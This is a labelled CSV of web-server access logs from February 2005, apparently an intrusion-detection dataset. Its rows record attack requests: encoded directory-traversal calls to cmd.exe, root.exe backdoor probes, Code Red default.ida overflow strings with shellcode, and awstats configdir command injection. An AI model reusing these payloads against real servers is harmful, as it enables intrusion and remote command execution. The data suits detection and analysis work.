Date~,Time~,ClientIP$,HTTP_method,ClientRequestLine@,Http_protocol@,StatusCode,ObjectSize~,Referrer~,Agent@,label_event_type~,label_IPpair_ID~
"2005-02-17","01:27:30","201.129.65.141","GET","/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'400'",974,"-","-","AB","S67"
"2005-02-17","01:27:30","201.129.65.141","GET","/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S67"
"2005-02-17","01:27:31","201.129.65.141","GET","/scripts/..%252f../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S67"
"2005-02-17","03:42:45","218.7.163.19","GET","http://www.google.com/intl/zh-CN/","HTTP/1.0","'404'",1052,"-","HTTPClient","AH","S217"
"2005-02-17","05:13:29","69.153.13.148","GET","/scripts/root.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S537"
"2005-02-17","05:13:29","69.153.13.148","GET","/MSADC/root.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S537"
"2005-02-17","05:13:29","69.153.13.148","GET","/c/winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S537"
"2005-02-17","05:13:29","69.153.13.148","GET","/d/winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S537"
"2005-02-17","05:13:30","69.153.13.148","GET","/scripts/..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S537"
"2005-02-17","05:13:30","69.153.13.148","GET","/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S537"
"2005-02-17","05:13:30","69.153.13.148","GET","/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S537"
"2005-02-17","05:13:30","69.153.13.148","GET","/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S537"
"2005-02-17","05:13:31","69.153.13.148","GET","/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S537"
"2005-02-17","05:13:31","69.153.13.148","GET","/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S537"
"2005-02-17","05:13:31","69.153.13.148","GET","/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S537"
"2005-02-17","05:13:31","69.153.13.148","GET","/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S537"
"2005-02-17","05:13:31","69.153.13.148","GET","/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'400'",974,"-","-","AB","S537"
"2005-02-17","05:13:32","69.153.13.148","GET","/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'400'",974,"-","-","AB","S537"
"2005-02-17","05:13:32","69.153.13.148","GET","/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S537"
"2005-02-17","05:13:32","69.153.13.148","GET","/scripts/..%252f../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S537"
"2005-02-17","06:33:46","218.7.163.19","GET","http://www.google.com/intl/zh-CN/","HTTP/1.0","'404'",1052,"-","HTTPClient","AH","S217"
"2005-02-17","09:32:47","218.7.163.19","GET","http://www.google.com/intl/zh-CN/","HTTP/1.0","'404'",1052,"-","HTTPClient","AH","S217"
"2005-02-17","11:44:36","81.6.250.202","GET","/NULL.printer","-","'404'",1061,"-","-","AA","S575"
"2005-02-17","12:14:14","61.10.7.243","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S376"
"2005-02-17","15:23:38","218.7.163.19","GET","http://www.google.com/intl/zh-CN/","HTTP/1.0","'404'",1052,"-","HTTPClient","AH","S217"
"2005-02-17","19:49:50","61.88.122.10","GET","/NULL.printer","-","'404'",1061,"-","-","AA","S417"
"2005-02-17","19:57:07","61.10.7.119","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S361"
"2005-02-17","21:53:43","172.134.23.11","GET","/default.ida?XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078%u0000%u00=a","HTTP/1.0","'404'",1061,"-","-","AA","S31"
"2005-02-18","00:33:50","209.213.220.227","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S120"
"2005-02-18","06:31:37","206.49.194.36","GET","/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir","-","'404'",1061,"-","-","AA","S99"
"2005-02-18","06:31:37","206.49.194.36","GET","/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir","-","'404'",1061,"-","-","AA","S99"
"2005-02-18","06:31:39","206.49.194.36","GET","/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir","-","'404'",1061,"-","-","AA","S99"
"2005-02-18","06:31:39","206.49.194.36","GET","/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir","-","'404'",1061,"-","-","AA","S99"
"2005-02-18","06:31:39","206.49.194.36","GET","/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir","-","'404'",1061,"-","-","AA","S99"
"2005-02-18","06:31:41","206.49.194.36","GET","/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir","-","'404'",1061,"-","-","AA","S99"
"2005-02-22","15:51:39","211.59.0.40","GET","/scripts/root.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S155"
"2005-02-22","15:51:44","211.59.0.40","GET","/MSADC/root.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S155"
"2005-02-22","15:51:49","211.59.0.40","GET","/c/winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S155"
"2005-02-22","15:51:53","211.59.0.40","GET","/d/winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S155"
"2005-02-22","15:51:57","211.59.0.40","GET","/scripts/..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S155"
"2005-02-22","15:52:02","211.59.0.40","GET","/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S155"
"2005-02-22","15:52:06","211.59.0.40","GET","/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S155"
"2005-02-22","15:52:11","211.59.0.40","GET","/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S155"
"2005-02-22","15:52:16","211.59.0.40","GET","/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S155"
"2005-02-22","15:52:21","211.59.0.40","GET","/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S155"
"2005-02-22","15:52:25","211.59.0.40","GET","/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S155"
"2005-02-22","15:52:30","211.59.0.40","GET","/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S155"
"2005-02-22","15:52:35","211.59.0.40","GET","/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'400'",974,"-","-","AB","S155"
"2005-02-22","15:52:40","211.59.0.40","GET","/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'400'",974,"-","-","AB","S155"
"2005-02-22","15:52:44","211.59.0.40","GET","/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S155"
"2005-02-22","15:52:49","211.59.0.40","GET","/scripts/..%252f../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S155"
"2005-02-22","18:41:47","69.139.247.161","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S536"
"2005-02-22","20:37:28","18.241.6.24","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S42"
"2005-02-22","21:53:02","218.19.63.215","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S191"
"2005-02-23","01:09:57","212.59.13.202","GET","/sumthin","HTTP/1.0","'404'",1061,"-","-","AA","S160"
"2005-02-23","01:58:05","208.189.245.200","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S108"
"2005-02-23","02:09:40","63.245.85.123","GET","/default.ida?XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078%u0000%u00=a","HTTP/1.0","'404'",1061,"-","-","AA","S434"
"2005-02-23","08:02:38","202.164.101.56","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S78"
"2005-02-23","11:22:39","81.6.250.202","GET","/scripts/nsiislog.dll","HTTP/1.1","'404'",1050,"-","-","AA","S575"
"2005-02-23","12:37:57","219.136.113.141","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S240"
"2005-02-23","16:16:54","218.88.202.208","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S232"
"2005-02-23","16:46:10","63.245.85.123","GET","/default.ida?XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078%u0000%u00=a","HTTP/1.0","'404'",1061,"-","-","AA","S434"
"2005-02-23","19:50:21","68.143.95.195","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S514"
"2005-02-23","22:18:56","69.229.28.252","GET","/scripts/root.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S543"
"2005-02-23","22:18:56","69.229.28.252","GET","/MSADC/root.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S543"
"2005-02-23","22:18:57","69.229.28.252","GET","/c/winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S543"
"2005-02-23","22:18:57","69.229.28.252","GET","/d/winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S543"
"2005-02-23","22:18:57","69.229.28.252","GET","/scripts/..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S543"
"2005-02-23","22:18:57","69.229.28.252","GET","/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S543"
"2005-02-23","22:18:58","69.229.28.252","GET","/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S543"
"2005-02-23","22:18:58","69.229.28.252","GET","/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S543"
"2005-02-23","22:18:58","69.229.28.252","GET","/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S543"
"2005-02-23","22:18:59","69.229.28.252","GET","/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S543"
"2005-02-23","22:18:59","69.229.28.252","GET","/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S543"
"2005-02-23","22:18:59","69.229.28.252","GET","/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S543"
"2005-02-23","22:18:59","69.229.28.252","GET","/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'400'",974,"-","-","AB","S543"
"2005-02-23","22:19:00","69.229.28.252","GET","/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'400'",974,"-","-","AB","S543"
"2005-02-23","22:19:00","69.229.28.252","GET","/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S543"
"2005-02-23","22:19:00","69.229.28.252","GET","/scripts/..%252f../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S543"
"2005-02-23","22:32:16","198.31.97.149","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S58"
"2005-02-23","22:44:31","61.183.81.129","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S400"
"2005-02-23","23:52:47","67.86.96.100","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S510"
"2005-02-24","02:55:43","12.47.120.130","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S4"
"2005-02-24","03:32:44","203.84.191.209","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S92"
"2005-02-24","04:09:52","24.99.140.64","GET","/scripts/root.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S345"
"2005-02-24","04:09:53","24.99.140.64","GET","/MSADC/root.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S345"
"2005-02-24","04:09:53","24.99.140.64","GET","/c/winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S345"
"2005-02-24","04:09:53","24.99.140.64","GET","/d/winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S345"
"2005-02-24","04:09:53","24.99.140.64","GET","/scripts/..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S345"
"2005-02-24","04:09:53","24.99.140.64","GET","/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S345"
"2005-02-24","04:09:53","24.99.140.64","GET","/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S345"
"2005-02-24","04:09:53","24.99.140.64","GET","/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S345"
"2005-02-24","04:09:54","24.99.140.64","GET","/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S345"
"2005-02-24","04:09:54","24.99.140.64","GET","/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S345"
"2005-02-24","04:09:54","24.99.140.64","GET","/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S345"
"2005-02-24","04:09:54","24.99.140.64","GET","/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S345"
"2005-02-24","04:09:54","24.99.140.64","GET","/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'400'",974,"-","-","AB","S345"
"2005-02-24","04:09:54","24.99.140.64","GET","/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'400'",974,"-","-","AB","S345"
"2005-02-24","04:09:54","24.99.140.64","GET","/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S345"
"2005-02-24","04:09:55","24.99.140.64","GET","/scripts/..%252f../winnt/system32/cmd.exe?/c+dir","HTTP/1.0","'404'",1041,"-","-","AA","S345"
"2005-02-24","07:01:37","218.18.169.220","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S187"
"2005-02-24","07:16:43","66.99.250.98","GET","//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'404'",1051,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AJ","S488"
"2005-02-24","07:16:43","66.99.250.98","GET","//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'404'",1051,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AJ","S488"
"2005-02-24","07:16:44","66.99.250.98","GET","//cgi-bin/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'404'",1051,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AJ","S488"
"2005-02-24","07:16:45","66.99.250.98","GET","//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'404'",1051,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AJ","S488"
"2005-02-24","07:16:45","66.99.250.98","GET","//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'404'",1050,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AJ","S488"
"2005-02-24","07:16:45","66.99.250.98","GET","//cgi-bin/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'404'",1050,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AJ","S488"
"2005-02-24","07:16:46","66.99.250.98","GET","//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'404'",1050,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AJ","S488"
"2005-02-24","07:16:46","66.99.250.98","GET","//cgi/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'404'",1050,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AJ","S488"
"2005-02-24","07:16:46","66.99.250.98","GET","//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'404'",1050,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AJ","S488"
"2005-02-24","07:16:47","66.99.250.98","GET","//cgi-bin/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'404'",1051,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AJ","S488"
"2005-02-24","07:16:47","66.99.250.98","GET","//cgi-bin/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'404'",1050,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AJ","S488"
"2005-02-24","07:16:47","66.99.250.98","GET","//cgi/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'404'",1051,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AJ","S488"
"2005-02-24","07:16:47","66.99.250.98","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AE","S488"
"2005-02-24","07:16:47","66.99.250.98","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AE","S488"
"2005-02-24","07:16:47","66.99.250.98","GET","//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'404'",1050,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AJ","S488"
"2005-02-24","07:16:47","66.99.250.98","GET","//cgi/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'404'",1051,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AJ","S488"
"2005-02-24","07:16:48","66.99.250.98","GET","//cgi/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'404'",1050,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AJ","S488"
"2005-02-24","07:16:48","66.99.250.98","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AE","S488"
"2005-02-24","07:16:49","66.99.250.98","GET","//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'404'",1050,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AJ","S488"
"2005-02-24","07:16:49","66.99.250.98","GET","//cgi-bin/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'404'",1050,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AJ","S488"
"2005-02-24","07:16:49","66.99.250.98","GET","//cgi/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'404'",1050,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AJ","S488"
"2005-02-24","07:16:49","66.99.250.98","GET","//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'404'",1050,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AJ","S488"
"2005-02-24","07:16:50","66.99.250.98","GET","//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'404'",1050,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AJ","S488"
"2005-02-24","07:16:50","66.99.250.98","GET","//cgi/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'404'",1050,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AJ","S488"
"2005-02-24","07:16:50","66.99.250.98","GET","//cgi-bin/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'404'",1050,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AJ","S488"
"2005-02-24","07:16:50","66.99.250.98","GET","//cgi-bin/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'404'",1050,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AJ","S488"
"2005-02-24","07:16:50","66.99.250.98","GET","//cgi-bin/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'404'",1050,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AJ","S488"
"2005-02-24","07:16:50","66.99.250.98","GET","//cgi/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'404'",1050,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AJ","S488"
"2005-02-24","07:16:50","66.99.250.98","GET","//cgi-bin/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'404'",1050,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AJ","S488"
"2005-02-24","07:16:50","66.99.250.98","GET","//cgi-bin/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'404'",1050,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AJ","S488"
"2005-02-24","07:16:51","66.99.250.98","GET","//cgi/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'404'",1050,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AJ","S488"
"2005-02-24","07:16:51","66.99.250.98","GET","//cgi-bin/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'404'",1050,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AJ","S488"
"2005-02-24","07:16:51","66.99.250.98","GET","//cgi/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'404'",1050,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AJ","S488"
"2005-02-24","07:16:52","66.99.250.98","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AE","S488"
"2005-02-24","07:16:52","66.99.250.98","GET","//cgi/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'404'",1050,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AJ","S488"
"2005-02-24","07:16:52","66.99.250.98","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AE","S488"
"2005-02-24","07:16:52","66.99.250.98","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AE","S488"
"2005-02-24","07:16:52","66.99.250.98","GET","//cgi/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'404'",1050,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AJ","S488"
"2005-02-24","07:16:53","66.99.250.98","GET","//cgi/awstats.pl?configdir=|%20id%20|","HTTP/1.1","'404'",1050,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AJ","S488"
"2005-02-24","07:16:53","66.99.250.98","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AE","S488"
"2005-02-24","07:16:54","66.99.250.98","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AE","S488"
"2005-02-24","07:16:59","66.99.250.98","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)","AE","S488"
"2005-02-24","08:07:02","61.180.25.162","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S397"
"2005-02-24","14:01:58","24.9.2.119","GET","/","HTTP/1.1","'403'",2898,"-","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","AE","S343"
